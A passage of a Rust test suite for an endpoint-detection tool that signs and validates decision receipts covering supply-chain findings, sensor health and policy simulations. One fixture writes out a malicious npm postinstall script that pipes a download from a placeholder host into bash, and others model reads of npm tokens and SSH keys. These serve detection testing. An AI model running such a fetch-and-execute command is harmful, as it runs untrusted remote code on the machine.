        let err = serde_json::from_value::<EndpointDecisionReceipt>(receipt_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("unsignedExtra"),
            "expected unknown endpoint receipt field to be rejected, got {err}"
        );

        let mut clock_value = serde_json::to_value(&receipt.clock)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint clock: {err}"));
        clock_value["shadowUncertaintyMs"] = serde_json::Value::Number(7.into());
        let err = serde_json::from_value::<EndpointClockState>(clock_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowUncertaintyMs"),
            "expected unknown endpoint clock field to be rejected, got {err}"
        );

        let mut actor_value = serde_json::to_value(&receipt.actor)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint actor: {err}"));
        actor_value["shadowSessionId"] = serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointDecisionActor>(actor_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowSessionId"),
            "expected unknown endpoint actor field to be rejected, got {err}"
        );

        let mut decision_value = serde_json::to_value(&receipt.decision)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint decision: {err}"));
        decision_value["shadowAction"] = serde_json::Value::String("allow".into());
        let err = serde_json::from_value::<EndpointDecisionRecord>(decision_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowAction"),
            "expected unknown endpoint decision field to be rejected, got {err}"
        );

        let mut policy_value = serde_json::to_value(&receipt.policy)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint policy: {err}"));
        policy_value["shadowPolicyEpoch"] = serde_json::Value::Number(8.into());
        let err = serde_json::from_value::<EndpointPolicySnapshot>(policy_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowPolicyEpoch"),
            "expected unknown endpoint policy field to be rejected, got {err}"
        );

        let mut signer_value = serde_json::to_value(&receipt.signer)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint signer: {err}"));
        signer_value["shadowSignerPublicKey"] =
            serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointReceiptSigner>(signer_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowSignerPublicKey"),
            "expected unknown endpoint signer field to be rejected, got {err}"
        );

        let mut graph_value = serde_json::to_value(&receipt.graph)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint graph reference: {err}"));
        graph_value["shadowGraphSliceId"] = serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointGraphReference>(graph_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowGraphSliceId"),
            "expected unknown endpoint graph reference field to be rejected, got {err}"
        );

        let mut sensor_state_value = serde_json::to_value(&receipt.sensor_state)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint sensor state: {err}"));
        sensor_state_value["shadowProviderCount"] = serde_json::Value::Number(1.into());
        let err = serde_json::from_value::<EndpointSensorState>(sensor_state_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowProviderCount"),
            "expected unknown endpoint sensor state field to be rejected, got {err}"
        );

        let mut provider_state_value = serde_json::to_value(&receipt.sensor_state.providers[0])
            .unwrap_or_else(|err| panic!("failed to serialize endpoint provider state: {err}"));
        provider_state_value["shadowRuntimeStatus"] =
            serde_json::Value::String("must not be ignored".into());
        let err = serde_json::from_value::<EndpointProviderState>(provider_state_value)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowRuntimeStatus"),
            "expected unknown endpoint provider state field to be rejected, got {err}"
        );

        let mut mismatched_finding_id = receipt.clone();
        if let Some(finding_id_evidence) = mismatched_finding_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "detectionFindingId")
        {
            *finding_id_evidence =
                EndpointReceiptEvidence::hashed("detectionFindingId", "finding:other");
        }
        assert!(mismatched_finding_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection finding id evidence hash"));

        let mut relabeled_finding_id = receipt.clone();
        relabeled_finding_id.decision.finding_id = Some("finding:other".to_string());
        if let Some(finding_id_evidence) = relabeled_finding_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "detectionFindingId")
        {
            *finding_id_evidence =
                EndpointReceiptEvidence::hashed("detectionFindingId", "finding:other");
        }
        assert!(relabeled_finding_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection finding id"));

        let mut missing_graph_slice = receipt.clone();
        missing_graph_slice
            .evidence
            .retain(|item| item.key != "detectionGraphSliceId");
        assert!(missing_graph_slice
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection graph slice evidence"));

        let mut mismatched_process_reference = receipt.clone();
        mismatched_process_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(process_node_evidence) = mismatched_process_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "detectionProcessNodeId")
        {
            *process_node_evidence =
                EndpointReceiptEvidence::hashed("detectionProcessNodeId", "node:other");
        }
        assert!(mismatched_process_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection process node reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "detectionGraphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("detectionGraphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("detection graph slice reference"));
    }

    #[test]
    fn endpoint_decision_receipt_rejects_missing_required_evidence_boundaries() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::PackageRegistryToken,
            path: Some("/Users/alice/.npmrc".to_string()),
            name: None,
        });
        let finding = guard.evaluate(&event).into_iter().next().unwrap();
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let valid = valid_detection_receipt(
            8,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );

        let mut missing_policy_hash = valid.clone();
        missing_policy_hash.policy.policy_hash.clear();
        assert!(missing_policy_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy hash"));

        let mut missing_policy_epoch = valid.clone();
        missing_policy_epoch.policy.policy_epoch = 0;
        assert!(missing_policy_epoch
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy epoch"));

        let mut missing_sensor_state = valid.clone();
        missing_sensor_state.sensor_state.providers.clear();
        assert!(missing_sensor_state
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state"));

        let mut missing_signer = valid;
        missing_signer.signer.signer_identity.clear();
        assert!(missing_signer
            .validate()
            .unwrap_err()
            .to_string()
            .contains("signer identity"));

        let mut missing_confidence = valid_detection_receipt(
            9,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        missing_confidence.decision.confidence = None;
        assert!(missing_confidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("confidence"));

        let mut missing_evidence = valid_detection_receipt(
            10,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        missing_evidence.evidence.clear();
        assert!(missing_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence"));

        let mut blank_evidence_key = valid_detection_receipt(
            11,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        blank_evidence_key.evidence[0].key.clear();
        assert!(blank_evidence_key
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence key"));

        let mut malformed_evidence_hash = valid_detection_receipt(
            12,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        malformed_evidence_hash.evidence[0].value_hash = "not-a-hash".to_string();
        assert!(malformed_evidence_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence value hash"));

        let mut duplicate_evidence_key = valid_detection_receipt(
            13,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        duplicate_evidence_key.evidence[1].key = duplicate_evidence_key.evidence[0].key.clone();
        assert!(duplicate_evidence_key
            .validate()
            .unwrap_err()
            .to_string()
            .contains("duplicate evidence key"));
    }

    #[test]
    fn endpoint_decision_receipt_rejects_signer_public_key_mismatch() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut event = observation(EndpointEvent::ProcessExec {
            image: "/Users/alice/Downloads/build-helper".to_string(),
            args: vec!["--postinstall".to_string()],
            env: BTreeMap::new(),
        });
        event.process.signing = CodeSignatureStatus {
            trust: SignatureTrust::Unsigned,
            notarized: Some(false),
            ..CodeSignatureStatus::default()
        };
        let finding = guard.evaluate(&event).into_iter().next().unwrap();
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let keypair = hush_core::Keypair::from_seed(&[9u8; 32]);
        let other = hush_core::Keypair::from_seed(&[10u8; 32]);
        let mut receipt = valid_detection_receipt(
            9,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        receipt.signer.signer_public_key = Some(other.public_key().to_hex());

        let err = receipt.sign_with(&keypair).unwrap_err();

        assert!(err.to_string().contains("public key"));
    }

    #[test]
    fn endpoint_decision_receipt_signing_embeds_signer_public_key_when_missing() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("leftpad-plus".to_string()),
            phase: "postinstall".to_string(),
            script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
            working_directory: Some("/tmp/pkg".to_string()),
        });
        let finding = guard.evaluate(&event).into_iter().next().unwrap();
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let keypair = hush_core::Keypair::from_seed(&[12u8; 32]);
        let receipt = valid_detection_receipt(
            13,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );

        let signed = receipt.sign_with(&keypair).unwrap();
        let signer_public_key = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .and_then(|endpoint| endpoint.get("signer"))
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str);

        assert_eq!(
            signer_public_key,
            Some(keypair.public_key().to_hex().as_str())
        );
    }

    #[test]
    fn endpoint_sensor_state_receipt_binds_provider_health() {
        let keypair = hush_core::Keypair::from_seed(&[14u8; 32]);
        let sensor_state = EndpointSensorState {
            providers: vec![
                EndpointProviderState {
                    provider_id: "agent-api".to_string(),
                    provider_kind: EndpointProviderKind::AgentApi,
                    installed: true,
                    active: true,
                    healthy: true,
                    degraded: false,
                    degradation_reasons: Vec::new(),
                    dropped_event_count: 0,
                    deadline_miss_count: 0,
                    full_disk_access: None,
                    last_seen: Some(Utc::now()),
                },
                EndpointProviderState {
                    provider_id: "macos.endpoint_security".to_string(),
                    provider_kind: EndpointProviderKind::EndpointSecurity,
                    installed: true,
                    active: false,
                    healthy: false,
                    degraded: true,
                    degradation_reasons: vec!["missing full disk access".to_string()],
                    dropped_event_count: 2,
                    deadline_miss_count: 1,
                    full_disk_access: Some(false),
                    last_seen: None,
                },
            ],
        };
        let mut receipt =
            EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
                local_sequence: 13,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state,
                reason: "prove protection state",
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::SensorState
        );
        assert!(!receipt.decision.passed);
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.sensor_state")
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "degradedProviderCount"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "sensorStateHash"));

        let mut mismatched_provider_count = receipt.clone();
        if let Some(provider_count_evidence) = mismatched_provider_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerCount")
        {
            *provider_count_evidence = EndpointReceiptEvidence::hashed("providerCount", "1");
        }
        assert!(mismatched_provider_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state provider count evidence hash"));

        let mut mismatched_provider_ids = receipt.clone();
        if let Some(provider_ids_evidence) = mismatched_provider_ids
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerIds")
        {
            *provider_ids_evidence = EndpointReceiptEvidence::hashed("providerIds", "agent-api");
        }
        assert!(mismatched_provider_ids
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state provider ids evidence hash"));

        let mut relabeled_provider_ids = receipt.clone();
        relabeled_provider_ids.sensor_state.providers[1].provider_id =
            "macos.endpoint_security.relabel".to_string();
        if let Some(provider_ids_evidence) = relabeled_provider_ids
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerIds")
        {
            *provider_ids_evidence = EndpointReceiptEvidence::hashed(
                "providerIds",
                "agent-api,macos.endpoint_security.relabel",
            );
        }
        assert!(relabeled_provider_ids
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state id"));

        let mut relabeled_active_count = receipt.clone();
        relabeled_active_count.sensor_state.providers[1].active = true;
        relabeled_active_count.sensor_state.providers[1].last_seen =
            Some(receipt.clock.captured_at);
        if let Some(active_count_evidence) = relabeled_active_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "activeProviderCount")
        {
            *active_count_evidence = EndpointReceiptEvidence::hashed("activeProviderCount", "2");
        }
        assert!(relabeled_active_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state id"));

        let mut relabeled_sensor_state_hash = receipt.clone();
        relabeled_sensor_state_hash.sensor_state.providers[1].degradation_reasons =
            vec!["network extension offline".to_string()];
        let sensor_state_value = serde_json::to_value(&relabeled_sensor_state_hash.sensor_state)
            .unwrap_or_else(|err| panic!("failed to serialize relabeled sensor state: {err}"));
        let canonical_sensor_state = canonicalize_json(&sensor_state_value)
            .unwrap_or_else(|err| panic!("failed to canonicalize relabeled sensor state: {err}"));
        let sensor_state_hash = sha256(canonical_sensor_state.as_bytes()).to_hex_prefixed();
        if let Some(sensor_state_hash_evidence) = relabeled_sensor_state_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "sensorStateHash")
        {
            *sensor_state_hash_evidence =
                EndpointReceiptEvidence::hashed("sensorStateHash", sensor_state_hash);
        }
        assert!(relabeled_sensor_state_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state id"));

        let mut unmarked_degraded_provider = receipt.clone();
        unmarked_degraded_provider.sensor_state.providers[1].degraded = false;
        assert!(unmarked_degraded_provider
            .validate()
            .unwrap_err()
            .to_string()
            .contains("marked degraded"));

        let mut missing_active_last_seen = receipt.clone();
        missing_active_last_seen.sensor_state.providers[0].last_seen = None;
        assert!(missing_active_last_seen
            .validate()
            .unwrap_err()
            .to_string()
            .contains("last seen"));

        let mut future_active_last_seen = receipt.clone();
        future_active_last_seen.sensor_state.providers[0].last_seen =
            Some(receipt.clock.captured_at + chrono::Duration::seconds(5));
        assert!(future_active_last_seen
            .validate()
            .unwrap_err()
            .to_string()
            .contains("after receipt capture"));

        let mut missing_degraded_reason = receipt.clone();
        missing_degraded_reason.sensor_state.providers[1]
            .degradation_reasons
            .clear();
        assert!(missing_degraded_reason
            .validate()
            .unwrap_err()
            .to_string()
            .contains("degradation reason"));

        let mut blank_degraded_reason = receipt;
        blank_degraded_reason.sensor_state.providers[1].degradation_reasons =
            vec!["  ".to_string()];
        assert!(blank_degraded_reason
            .validate()
            .unwrap_err()
            .to_string()
            .contains("degradation reason"));
    }

    #[test]
    fn endpoint_sensor_state_receipt_rejects_duplicate_provider_ids() {
        let provider = EndpointProviderState {
            provider_id: "agent-api".to_string(),
            provider_kind: EndpointProviderKind::AgentApi,
            installed: true,
            active: true,
            healthy: true,
            degraded: false,
            degradation_reasons: Vec::new(),
            dropped_event_count: 0,
            deadline_miss_count: 0,
            full_disk_access: None,
            last_seen: Some(Utc::now()),
        };
        let mut receipt =
            EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
                local_sequence: 16,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState {
                    providers: vec![provider.clone(), provider],
                },
                reason: "prove protection state",
            });
        receipt.signer.signer_public_key = Some(
            hush_core::Keypair::from_seed(&[16u8; 32])
                .public_key()
                .to_hex(),
        );

        assert!(receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("duplicate sensor provider id"));
    }

    #[test]
    fn endpoint_provider_degradation_receipt_requires_degraded_provider() {
        let keypair = hush_core::Keypair::from_seed(&[15u8; 32]);
        let provider = EndpointProviderState {
            provider_id: "macos.endpoint_security".to_string(),
            provider_kind: EndpointProviderKind::EndpointSecurity,
            installed: true,
            active: false,
            healthy: false,
            degraded: true,
            degradation_reasons: vec!["missing_full_disk_access".to_string()],
            dropped_event_count: 3,
            deadline_miss_count: 2,
            full_disk_access: Some(false),
            last_seen: Some(Utc::now()),
        };
        let sensor_state = EndpointSensorState {
            providers: vec![provider.clone()],
        };
        let mut receipt = EndpointDecisionReceipt::for_provider_degradation(
            EndpointProviderDegradationReceiptInput {
                local_sequence: 14,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state,
                provider: &provider,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ProviderDegradation
        );
        assert!(!receipt.decision.passed);
        assert!(receipt
            .decision
            .rule_id
            .as_deref()
            .unwrap_or_default()
            .contains("macos.endpoint_security"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "degradationReasons"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "fullDiskAccess"));

        let mut mismatched_provider_id = receipt.clone();
        if let Some(provider_id_evidence) = mismatched_provider_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerId")
        {
            *provider_id_evidence = EndpointReceiptEvidence::hashed("providerId", "agent-api");
        }
        assert!(mismatched_provider_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider degradation provider id evidence hash"));

        let mut missing_degradation_reasons = receipt.clone();
        missing_degradation_reasons
            .evidence
            .retain(|item| item.key != "degradationReasons");
        assert!(missing_degradation_reasons
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider degradation reasons evidence"));

        let mut mismatched_full_disk_access = receipt.clone();
        if let Some(full_disk_access_evidence) = mismatched_full_disk_access
            .evidence
            .iter_mut()
            .find(|item| item.key == "fullDiskAccess")
        {
            *full_disk_access_evidence = EndpointReceiptEvidence::hashed("fullDiskAccess", "true");
        }
        assert!(mismatched_full_disk_access
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider degradation full-disk-access evidence hash"));

        let mut relabeled_degradation_id = receipt.clone();
        relabeled_degradation_id.decision.finding_id =
            Some("provider_degradation:other".to_string());
        assert!(relabeled_degradation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider degradation id"));

        let mut no_degraded_provider = receipt;
        let receipt_captured_at = no_degraded_provider.clock.captured_at;
        no_degraded_provider.sensor_state.providers[0] = EndpointProviderState {
            provider_id: "agent-api".to_string(),
            provider_kind: EndpointProviderKind::AgentApi,
            installed: true,
            active: true,
            healthy: true,
            degraded: false,
            degradation_reasons: Vec::new(),
            dropped_event_count: 0,
            deadline_miss_count: 0,
            full_disk_access: None,
            last_seen: Some(receipt_captured_at),
        };
        assert!(no_degraded_provider
            .validate()
            .unwrap_err()
            .to_string()
            .contains("degraded provider"));
    }

    #[test]
    fn endpoint_observation_receipt_binds_provider_graph_and_content_hash() {
        let keypair = hush_core::Keypair::from_seed(&[17u8; 32]);
        let observation = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.ssh/id_ed25519".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&observation);
        let graph = recorder.into_graph();
        let sensor_state = EndpointSensorState {
            providers: vec![EndpointProviderState {
                provider_id: "macos.endpoint_security".to_string(),
                provider_kind: EndpointProviderKind::EndpointSecurity,
                installed: true,
                active: true,
                healthy: true,
                degraded: false,
                degradation_reasons: Vec::new(),
                dropped_event_count: 0,
                deadline_miss_count: 0,
                full_disk_access: Some(true),
                last_seen: Some(observation.timestamp),
            }],
        };
        let mut receipt =
            EndpointDecisionReceipt::for_observation(EndpointObservationReceiptInput {
                local_sequence: 15,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state,
                observation: &observation,
                graph: &graph,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::Observation
        );
        assert_eq!(
            receipt.decision.observation_id.as_deref(),
            Some(observation.observation_id.as_str())
        );
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.observation.file_access")
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert_eq!(
            receipt.sensor_state.providers[0].provider_id,
            "macos.endpoint_security"
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "observationHash"));

        let mut mismatched_observation_hash = receipt.clone();
        if let Some(observation_hash) = mismatched_observation_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "observationHash")
        {
            *observation_hash = EndpointReceiptEvidence::hashed("observationHash", "sha256:other");
        }
        assert!(mismatched_observation_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("observation receipt id"));

        let mut mismatched_provider_kind = receipt.clone();
        if let Some(provider_kind) = mismatched_provider_kind
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerKind")
        {
            *provider_kind = EndpointReceiptEvidence::hashed("providerKind", "network_extension");
        }
        assert!(mismatched_provider_kind
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider kind evidence"));

        let mut wrong_action = receipt;
        wrong_action.decision.action = EndpointDecisionAction::Alert;
        assert!(wrong_action
            .validate()
            .unwrap_err()
            .to_string()
            .contains("action must be observe"));
    }

    #[test]
    fn endpoint_policy_simulation_scores_graph_breakage_and_signs_receipt() {
        let script_event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("left-pad".to_string()),
            phase: "postinstall".to_string(),
            script: "node ./postinstall.js".to_string(),
            working_directory: Some("/repo".to_string()),
        });
        let credential_event = EndpointObservation {
            observation_id: stable_id("test", ["obs", "credential-sim"]),
            event: EndpointEvent::CredentialAccess {
                kind: CredentialKind::PackageRegistryToken,
                path: Some("/Users/alice/.npmrc".to_string()),
                name: Some("npm-token".to_string()),
            },
            ..observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::PackageRegistryToken,
                path: Some("/Users/alice/.npmrc".to_string()),
                name: Some("npm-token".to_string()),
            })
        };
        let mut tool_event = observation(EndpointEvent::ToolCall {
            tool_name: "mcp.shell".to_string(),
            parameters: serde_json::json!({
                "command": "npm install"
            }),
        });
        tool_event.metadata.insert(
            "toolCallId".to_string(),
            serde_json::json!("tool-call-sim-1"),
        );
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&script_event);
        graph_recorder.record_observation(&credential_event);
        graph_recorder.record_observation(&tool_event);
        let process_node_id = script_event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 8)
            .unwrap();
        let simulation = EndpointPolicySimulationReport::for_rule(
            EndpointPolicySimulationRule {
                rule_id: "endpoint.policy.simulate.block_npm".to_string(),
                action: EndpointDecisionAction::Block,
                description: Some("block npm postinstall".to_string()),
            },
            &process_node_id,
            &subgraph,
        );

        assert!(simulation.would_block);
        assert!(simulation.developer_breakage_score >= 70);
        assert_eq!(simulation.affected_process_count, 1);
        assert!(simulation.affected_credential_count >= 1);
        assert!(simulation
            .affected_nodes
            .iter()
            .any(|node| node.kind == CausalNodeKind::PackageScript));
        assert!(simulation
            .affected_identities
            .iter()
            .any(|identity| identity.identity_kind == "user" && identity.value == "alice"));
        assert!(simulation
            .affected_identities
            .iter()
            .any(|identity| identity.identity_kind == "session" && identity.value == "session-1"));
        assert!(simulation.affected_tools.iter().any(|tool| {
            tool.tool_name == "mcp.shell" && tool.tool_call_id.as_deref() == Some("tool-call-sim-1")
        }));
        assert_unknown_field_rejected::<EndpointPolicySimulationRule>(
            serde_json::to_value(EndpointPolicySimulationRule {
                rule_id: "endpoint.policy.simulate.block_npm".to_string(),
                action: EndpointDecisionAction::Block,
                description: Some("block npm postinstall".to_string()),
            })
            .unwrap(),
            "shadowRuleMode",
        );
        assert_unknown_field_rejected::<EndpointPolicySimulationReport>(
            serde_json::to_value(&simulation).unwrap(),
            "shadowWouldBreak",
        );
        assert_unknown_field_rejected::<EndpointPolicySimulationAffectedNode>(
            serde_json::to_value(&simulation.affected_nodes[0]).unwrap(),
            "shadowBreakageReason",
        );
        assert_unknown_field_rejected::<EndpointPolicySimulationIdentityContext>(
            serde_json::to_value(&simulation.affected_identities[0]).unwrap(),
            "shadowIdentityValue",
        );
        assert_unknown_field_rejected::<EndpointPolicySimulationToolContext>(
            serde_json::to_value(&simulation.affected_tools[0]).unwrap(),
            "shadowToolCall",
        );

        let keypair = hush_core::Keypair::from_seed(&[12u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_simulation(EndpointSimulationReceiptInput {
            local_sequence: 11,
            endpoint_id: "endpoint-1",
            signer_identity: "local-edr:endpoint-1",
            policy: EndpointPolicySnapshot {
                policy_version: "test-policy@1".to_string(),
                policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                policy_epoch: 7,
            },
            sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
            simulation: &simulation,
            graph: &subgraph,
        });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::Simulation
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(simulation.simulation_id.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "contentHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "affectedIdentityContext"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "affectedToolContext"));

        let mut mismatched_simulation_id = receipt.clone();
        if let Some(simulation_id_evidence) = mismatched_simulation_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "simulationId")
        {
            *simulation_id_evidence =
                EndpointReceiptEvidence::hashed("simulationId", "policy_simulation:other");
        }
        assert!(mismatched_simulation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation id evidence hash"));

        let mut relabeled_simulation_id = receipt.clone();
        relabeled_simulation_id.decision.finding_id = Some("policy_simulation:other".to_string());
        if let Some(simulation_id_evidence) = relabeled_simulation_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "simulationId")
        {
            *simulation_id_evidence =
                EndpointReceiptEvidence::hashed("simulationId", "policy_simulation:other");
        }
        assert!(relabeled_simulation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation id"));

        let mut mismatched_root_node = receipt.clone();
        if let Some(root_node_evidence) = mismatched_root_node
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation root node evidence hash"));

        let mut mismatched_breakage_score = receipt.clone();
        if let Some(score_evidence) = mismatched_breakage_score
            .evidence
            .iter_mut()
            .find(|item| item.key == "developerBreakageScore")
        {
            *score_evidence = EndpointReceiptEvidence::hashed("developerBreakageScore", "0");
        }
        assert!(mismatched_breakage_score
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation breakage score evidence hash"));

        let mut missing_identity_context = receipt.clone();
